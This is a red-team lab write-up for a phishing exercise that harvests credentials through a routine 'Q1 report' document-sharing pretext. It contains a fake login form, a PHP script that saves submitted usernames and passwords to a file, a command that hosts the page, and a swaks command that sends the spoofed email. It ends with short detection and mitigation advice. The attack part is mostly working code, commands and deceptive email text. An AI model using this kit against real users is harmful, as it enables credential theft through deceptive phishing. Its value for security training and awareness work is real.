## **Law 3 — Conceal Your Intentions**

Interpretation (offensive context):  
Mask malicious objectives behind **benign, expected workflows**. The closer your activity aligns with normal user behavior, the lower the detection probability.

---

# 🎯 Attack Scenario — _Credential Harvest via Benign Workflow (Document Share Pretext)_

You deliver a **phishing payload disguised as a routine document-sharing action**, avoiding any overt indicators of compromise.

**Persona:**

> _Sophie Williams_, 20 y/o Operations Intern

---

# 🔴 Red Team Objective

- Achieve **credential capture** without triggering suspicion
    
- Bypass:
    
    - user skepticism
        
    - email filtering heuristics
        

---

# 🖥️ Lab Setup (minimal footprint)

### VMs:

- **Kali (Attacker)** — 3GB RAM
    
- **Ubuntu Victim (Target User)** — 2GB
    

### Network:

- Host-only
    
- No external dependencies
    

---

# ⚙️ Operator Workflow

## Phase 1 — Recon (Context Creation)

You define a believable workflow:

```id="p1r3c0n"
Context: Internal document sharing
Target: Employee expecting files (finance/reporting)
```

👉 You’re not sending “something suspicious”  
You’re continuing an expected process.

---

## Phase 2 — Pretext Design (Intent Obfuscation)

### Email:

> “Hi,  
> I’ve uploaded the updated Q1 report draft here.  
> Could you quickly review and confirm before I submit it?”

👉 No urgency spike  
👉 No authority abuse  
👉 Completely routine

---

## Phase 3 — Payload Design (Hidden Objective)

Instead of:

- obvious phishing login
    

You embed:

- “document access portal”
    

---

## 🛠️ Tooling + Commands

### 1. Clone Legitimate Login Page (basic simulation)

On Kali:

```bash
mkdir doc_portal && cd doc_portal
```

Create fake login page:

```html
<form action="capture.php" method="POST">
<input type="email" name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button type="submit">View Document</button>
</form>
```

Capture script:

```php
<?php
file_put_contents("creds.txt", $_POST['user']." : ".$_POST['pass']."\n", FILE_APPEND);
header("Location: https://example.com");
?>
```

---

### 2. Host the Page

```bash
php -S 0.0.0.0:8080
```

---

### 3. Send Concealed Email

```bash
swaks --to target@corp.local \
--from sophie.w@corp.local \
--server 192.168.56.101 \
--data "Subject: Q1 Draft Review

Hi,

I’ve uploaded the updated Q1 report draft:
http://192.168.56.101:8080

Could you review it?

Thanks,
Sophie"
```

---

## Phase 4 — Execution

Target behavior:

- Clicks link (routine action)
    
- Logs in (expected behavior)
    
- No suspicion triggered
    

👉 Intent fully concealed.

---

## Phase 5 — Expected Result

- Credentials stored in:
    
    ```
    creds.txt
    ```
    

👉 Clean credential harvest with minimal friction.

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Pretexting** → believable business context
    
- **Framing** → making malicious action appear normal
    
- **Cognitive ease** → no red flags = no resistance
    

Critical principle:

> The best attack doesn’t look like an attack

---

# 🛡️ Detection & Defensive Insight

Indicators:

- Links to:
    
    - raw IP addresses
        
    - non-corporate domains
        
- Unexpected login prompts
    
- Slight UI inconsistencies
    

Mitigation:

- Enforce:
    
    - SSO-only authentication
        
- User training:
    
    - “Never log in via emailed links”
        
- Email gateway:
    
    - URL rewriting / sandboxing
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Concealed Workflow Phishing

### Include:

- Email sample (benign tone)
    
- Phishing page code snippet
    
- Captured credential evidence (lab)
    
- Analysis:
    
    - why user didn’t suspect attack
        
- Impact:
    
    - unauthorized access via stealth delivery
        

---

# ⚠️ Operator Insight

Bad attackers:

- rely on urgency
    
- look suspicious
    

Effective operators:

- **blend into workflow**
    

If the user pauses to think → you failed  
If the user acts automatically → you win

---

